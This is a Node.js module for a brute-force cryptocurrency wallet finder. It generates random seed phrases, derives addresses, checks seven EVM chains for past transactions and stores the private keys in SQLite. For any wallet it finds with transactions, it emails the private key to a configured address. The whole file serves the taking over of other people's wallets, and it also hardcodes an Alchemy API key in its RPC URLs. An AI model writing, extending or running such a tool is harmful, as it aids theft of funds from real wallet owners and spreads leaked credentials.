const { ethers } = require('ethers');
const sqlite3 = require('sqlite3').verbose();
const axios = require('axios');
const nodemailer = require('nodemailer');
require('dotenv').config();

// Chain configuration
const CHAINS = {
    ethereum: {
        name: 'Ethereum',
        rpc: 'https://eth-mainnet.g.alchemy.com/v2/GcaMdML_ABouJgG7Sa2X8Xu5iRH5UTUF'
    },
    polygon: {
        name: 'Polygon',
        rpc: 'https://polygon-mainnet.g.alchemy.com/v2/GcaMdML_ABouJgG7Sa2X8Xu5iRH5UTUF'
    },
    arbitrum: {
        name: 'Arbitrum',
        rpc: 'https://arb-mainnet.g.alchemy.com/v2/GcaMdML_ABouJgG7Sa2X8Xu5iRH5UTUF'
    },
    bsc: {
        name: 'Binance Smart Chain',
        rpc: 'https://bsc-dataseed1.binance.org'
    },
    avalanche: {
        name: 'Avalanche C-Chain',
        rpc: 'https://api.avax.network/ext/bc/C/rpc'
    },
    base: {
        name: 'Base Chain',
        rpc: 'https://mainnet.base.org'
    },
    optimism: {
        name: 'OP Mainnet',
        rpc: 'https://mainnet.optimism.io'
    }
};

// Email configuration
const emailTransporter = nodemailer.createTransport({
    host: process.env.SMTP_HOST,
    port: parseInt(process.env.SMTP_PORT),
    secure: process.env.SMTP_PORT === '465',
    auth: {
        user: process.env.SMTP_USER,
        pass: process.env.SMTP_PASS
    }
});

// Initialize database
function initializeDatabase() {
    const db = new sqlite3.Database('wallets.db');

    db.serialize(() => {
        // Create mnemonics table
        db.run(`
            CREATE TABLE IF NOT EXISTS mnemonics (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                mnemonic TEXT NOT NULL,
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP
            )
        `);

        // Create wallets table
        db.run(`
            CREATE TABLE IF NOT EXISTS wallets (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                mnemonic_id INTEGER,
                private_key TEXT NOT NULL,
                wallet_address TEXT NOT NULL,
                derivation_path TEXT NOT NULL,
                ethereum_tx BOOLEAN DEFAULT 0,
                polygon_tx BOOLEAN DEFAULT 0,
                arbitrum_tx BOOLEAN DEFAULT 0,
                bsc_tx BOOLEAN DEFAULT 0,
                avalanche_tx BOOLEAN DEFAULT 0,
                base_tx BOOLEAN DEFAULT 0,
                optimism_tx BOOLEAN DEFAULT 0,
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                FOREIGN KEY (mnemonic_id) REFERENCES mnemonics(id)
            )
        `);

        // Create active_wallets table
        db.run(`
            CREATE TABLE IF NOT EXISTS active_wallets (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                wallet_address TEXT NOT NULL,
                private_key TEXT NOT NULL,
                chain_name TEXT NOT NULL,
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP
            )
        `);
    });

    return db;
}

// Send email notification for active wallet
async function sendActiveWalletNotification(wallet, chainName) {
    try {
        const mailOptions = {
            from: `"${process.env.EMAIL_FROM_NAME}" <${process.env.SMTP_USER}>`,
            to: process.env.NOTIFICATION_EMAIL,
            subject: process.env.EMAIL_SUBJECT || 'Active Wallet Found!',
            html: `
                <h2>Active Wallet Found!</h2>
                <p>A wallet with transactions has been discovered:</p>
                <ul>
                    <li><strong>Chain:</strong> ${chainName}</li>
                    <li><strong>Address:</strong> ${wallet.address}</li>
                    <li><strong>Private Key:</strong> ${wallet.privateKey}</li>
                    <li><strong>Discovery Time:</strong> ${new Date().toLocaleString()}</li>
                </ul>
                <p>Please secure this information appropriately.</p>
            `
        };

        const info = await emailTransporter.sendMail(mailOptions);
        console.log('Email notification sent:', info.messageId);
        return true;
    } catch (error) {
        console.error('Failed to send email notification:', error);
        return false;
    }
}

// Save mnemonic to database
async function saveMnemonic(db, mnemonic) {
    return new Promise((resolve, reject) => {
        const stmt = db.prepare('INSERT INTO mnemonics (mnemonic) VALUES (?)');
        stmt.run(mnemonic, function(err) {
            if (err) {
                reject(err);
                return;
            }
            resolve(this.lastID);
        });
        stmt.finalize();
    });
}

// Save wallet to database
async function saveWallet(db, mnemonicId, wallet, derivationPath) {
    return new Promise((resolve, reject) => {
        const stmt = db.prepare(`
            INSERT INTO wallets (
                mnemonic_id, private_key, wallet_address, derivation_path
            ) VALUES (?, ?, ?, ?)
        `);
        
        stmt.run(
            mnemonicId,
            wallet.privateKey,
            wallet.address,
            derivationPath,
            (err) => {
                if (err) {
                    reject(err);
                    return;
                }
                resolve();
            }
        );
        
        stmt.finalize();
    });
}

// Save active wallet to database
async function saveActiveWallet(db, wallet, chainName) {
    return new Promise(async (resolve, reject) => {
        try {
            const stmt = db.prepare(
                'INSERT INTO active_wallets (wallet_address, private_key, chain_name) VALUES (?, ?, ?)'
            );
            
            stmt.run(wallet.address, wallet.privateKey, chainName, async (err) => {
                if (err) {
                    reject(err);
                    return;
                }
                
                // Send email notification
                await sendActiveWalletNotification(wallet, chainName);
                resolve();
            });
            
            stmt.finalize();
        } catch (error) {
            reject(error);
        }
    });
}

// Generate wallets from mnemonic
async function generateWalletsFromMnemonic(mnemonic) {
    const wallets = [];
    const hdNode = ethers.HDNodeWallet.fromPhrase(mnemonic);

    // Generate 3 wallets with different derivation paths
    for (let i = 0; i < 3; i++) {
        const path = `m/44'/60'/0'/0/${i}`;
        const wallet = hdNode.derivePath(path);
        wallet.derivationPath = path;
        wallets.push(wallet);
    }

    return wallets;
}

// Check transactions for a wallet
async function checkTransactions(address, chain) {
    try {
        const provider = new ethers.JsonRpcProvider(chain.rpc);
        const txCount = await provider.getTransactionCount(address);
        return txCount > 0;
    } catch (error) {
        console.error(`Error checking transactions for ${chain.name}:`, error.message);
        return false;
    }
}

// Update transaction flags in database
async function updateTransactionFlags(db, wallet, chainResults) {
    return new Promise((resolve, reject) => {
        const updates = Object.entries(chainResults)
            .map(([chainId, hasTransactions]) => `${chainId}_tx = ${hasTransactions ? 1 : 0}`)
            .join(', ');

        const query = `
            UPDATE wallets 
            SET ${updates}
            WHERE wallet_address = ?
        `;

        db.run(query, [wallet.address], (err) => {
            if (err) {
                reject(err);
                return;
            }
            resolve();
        });
    });
}

// Generate mnemonic
function generateMnemonic() {
    return ethers.Wallet.createRandom().mnemonic.phrase;
}

// Verify email configuration
async function verifyEmailConfig() {
    try {
        await emailTransporter.verify();
        return true;
    } catch (error) {
        console.error('Email configuration error:', error);
        return false;
    }
}

module.exports = {
    CHAINS,
    initializeDatabase,
    saveMnemonic,
    saveWallet,
    saveActiveWallet,
    generateWalletsFromMnemonic,
    checkTransactions,
    updateTransactionFlags,
    generateMnemonic,
    verifyEmailConfig,
    sendActiveWalletNotification
};